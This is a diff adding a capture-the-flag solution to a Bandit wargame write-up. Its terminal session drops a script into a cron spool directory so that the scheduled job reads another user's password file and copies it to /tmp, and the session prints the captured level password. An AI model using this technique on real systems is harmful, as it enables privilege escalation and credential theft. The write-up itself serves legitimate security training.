@@ -1570,5 +1570,39 @@ NOTE 2: Keep in mind that your shell script is removed once executed, so you may
 Solution :
 
 
+```
+bandit23@bandit:/tmp/0x48piraj$ 
+bandit23@bandit:/tmp/0x48piraj$ nano 0x48piraj.sh
+Unable to create directory /home/bandit23/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+bandit23@bandit:/tmp/0x48piraj$ chmod 777 0x48piraj.sh 
+bandit23@bandit:/tmp/0x48piraj$ cp 0x48piraj.sh /var/spool/bandit24
+bandit23@bandit:/tmp/0x48piraj$ cd /var/spool/bandit24 && ls -la
+total 496
+drwxrwxrwx 7 bandit24 bandit24 479232 Jan 15 18:29 .
+drwxr-xr-x 5 root     root       4096 Oct 16 14:00 ..
+drwxrwxrwx 2 bandit23 bandit23   4096 Jan 15 17:51 bandit23
+drwxr-xr-x 2 bandit23 bandit23   4096 Jan 15 17:58 bandit24
+drwxr-xr-x 3 bandit29 bandit29   4096 Dec 26 10:23 bandit30
+drwxr-xr-x 3 bandit31 bandit31   4096 Dec 26 17:34 bandit32
+drwxr-xr-x 2 bandit23 bandit23   4096 Jan 15 11:06 hello
+bandit23@bandit:/tmp/0x48piraj$ cp 0x48piraj.sh /var/spool/bandit24
+bandit23@bandit:/var/spool/bandit24$ chmod 777 /tmp/0x48piraj
+bandit23@bandit:/var/spool/bandit24$ cd /tmp/0x48piraj
+bandit23@bandit:/tmp/0x48piraj$ ls
+0x48piraj.sh
+bandit23@bandit:/tmp/0x48piraj$ cp 0x48piraj.sh /var/spool/bandit24
+bandit23@bandit:/tmp/0x48piraj$ ls
+0x48piraj.sh  b24pass
+bandit23@bandit:/tmp/0x48piraj$ cat 0x48piraj.sh 
+#!/bin/sh
+cat /etc/bandit_pass/bandit24 >> /tmp/0x48piraj/b24pass
+bandit23@bandit:/tmp/0x48piraj$ cat b24pass 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@bandit:/tmp/0x48piraj$ 
+```
 
 
